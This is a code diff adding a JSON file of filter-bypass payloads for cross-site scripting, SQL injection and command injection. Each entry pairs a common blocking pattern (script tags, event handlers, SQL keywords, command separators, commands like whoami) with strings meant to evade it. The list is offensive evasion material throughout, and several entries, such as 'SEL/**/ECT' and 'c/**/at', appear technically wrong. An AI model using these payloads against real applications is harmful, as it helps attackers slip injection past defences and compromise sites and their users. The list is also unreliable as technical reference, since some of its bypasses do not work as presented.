@@ -1,0 +1,108 @@
+{
+    "xss_bypass": {
+        "common_filters": [
+            {
+                "description": "Basic script tag filter",
+                "filter": "<script>",
+                "bypass": [
+                    "<scr<script>ipt>",
+                    "<scr\\u0069pt>",
+                    "<scr\\u0000ipt>",
+                    "<scr\\u000Aipt>",
+                    "<scr\\u000Dipt>",
+                    "<scr\\u0009ipt>"
+                ]
+            },
+            {
+                "description": "Event handler filter",
+                "filter": "onerror|onload|onclick",
+                "bypass": [
+                    "on\\u0065rror",
+                    "on\\u0000error",
+                    "on\\u000Aerror",
+                    "on\\u000Derror",
+                    "on\\u0009error"
+                ]
+            },
+            {
+                "description": "JavaScript protocol filter",
+                "filter": "javascript:",
+                "bypass": [
+                    "j\\u0061vascript:",
+                    "j\\u0000avascript:",
+                    "j\\u000Avascript:",
+                    "j\\u000Dvascript:",
+                    "j\\u0009avascript:"
+                ]
+            }
+        ]
+    },
+    "sqli_bypass": {
+        "common_filters": [
+            {
+                "description": "Basic SQL keyword filter",
+                "filter": "SELECT|UNION|WHERE",
+                "bypass": [
+                    "SEL\\u0045CT",
+                    "UN\\u0049ON",
+                    "WH\\u0045RE",
+                    "SEL/**/ECT",
+                    "UN/**/ION",
+                    "WH/**/ERE"
+                ]
+            },
+            {
+                "description": "Comment filter",
+                "filter": "--|#|/*",
+                "bypass": [
+                    "--%0A",
+                    "--%0D",
+                    "--%09",
+                    "--%20",
+                    "--%23",
+                    "--%2F%2A"
+                ]
+            },
+            {
+                "description": "Space filter",
+                "filter": " ",
+                "bypass": [
+                    "%20",
+                    "%09",
+                    "%0A",
+                    "%0D",
+                    "/**/",
+                    "+"
+                ]
+            }
+        ]
+    },
+    "cmd_bypass": {
+        "common_filters": [
+            {
+                "description": "Command separator filter",
+                "filter": ";|&|\\|",
+                "bypass": [
+                    "%3B",
+                    "%26",
+                    "%7C",
+                    "%0A",
+                    "%0D",
+                    "%09"
+                ]
+            },
+            {
+                "description": "Command keyword filter",
+                "filter": "cat|ls|dir|whoami",
+                "bypass": [
+                    "c\\u0061t",
+                    "l\\u0073",
+                    "d\\u0069r",
+                    "w\\u0068oami",
+                    "c/**/at",
+                    "l/**/s"
+                ]
+            }
+        ]
+    }
+} 
